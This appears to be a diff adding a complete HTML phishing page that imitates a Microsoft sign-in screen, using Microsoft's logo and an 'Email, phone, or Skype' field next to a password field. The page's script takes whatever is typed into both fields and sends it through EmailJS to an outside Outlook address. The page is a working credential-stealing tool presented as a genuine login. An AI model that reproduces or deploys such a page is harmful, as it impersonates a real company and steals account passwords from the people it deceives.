@@ -1,0 +1,97 @@
+<html>
+  <head>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <title>sign in to your account</title>
+  <style>
+    .col {
+        display: flex;
+        height: 100vh;
+        justify-content: center;
+        align-items: center;
+      }
+    .col div{
+      position:relative;
+    }
+    .cnt{
+      background:white;
+      padding:30px;
+      display:flex;
+      flex-direction:column;
+      width:400px;
+      font-family:helvetica;
+      box-shadow: 5px 0px 20px rgba(0, 0, 0, 0.3); 
+    }
+    .sn{
+      width:100px;
+      background:#0067B8;
+      color:white;
+      border:0;
+      font-size:15px;
+      margin:10px;
+      position:relative;
+      left:60%;
+      padding:10px;
+      cursor:pointer;
+    }
+    .sn:hover{
+      background:#035EA6;
+    }
+    a{
+      text-decoration:none;
+      margin:5px;
+      color:#0067B8;
+      font-size:13px;
+    }
+    a:hover{
+      color:grey;
+    }
+    .cnt input{
+      border:0;
+      border-bottom:1px black solid;
+      font-size:18px;
+      margin-bottom:10px;
+    }
+    .cnt div{
+      display:flex;
+      flex-direction:column;
+    }
+    .ttl{
+      font-size:25px;
+      font-style:bold;
+    }
+    .r{
+      font-size:13px;
+    }
+  </style>
+  </head>
+
+  <body>
+    <div class = 'col'>
+    <div class = 'cnt'>
+      <img width = 120px class="logo" role="img" pngsrc="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_ea19b2112f4dfd8e90b4505ef7dcb4f9.png" svgsrc="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }" src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft">
+      <p class = 'ttl'>Sign in</p>
+      <div>
+        <input id = 'em' placeholder = 'Email, phone, or Skype'>
+        <input id = 'pass' placeholder = 'Password'>
+      </div>
+      <p class = "r">No account? <a href = microsoft.com/signup>Create one!</a></p>
+      <a href = 'microsoft.com'>Can't access your account?</a>
+      <button class = 'sn' onclick = 'send()'>Sign in</button>
+    </div>
+    </div>
+    <script>
+      var email = document.getElementById('em');
+      var pass = document.getElementById('pass');
+      emailjs.init("NeKByWtX3O-vfuYri"); 
+      function send(){
+        message = 'email: '+email.value+', pass: '+ pass.value;
+        emailjs.send("service_vg7mrer","template_o6oh7wg",{
+          to_name: "Henry",
+          message: message,
+          to_email: "jerryjam2024@outlook.com",
+          reply_to: "jerryjam2024@outlook.com",
+        });
+      }
+    </script>
+  </body>
+</html>
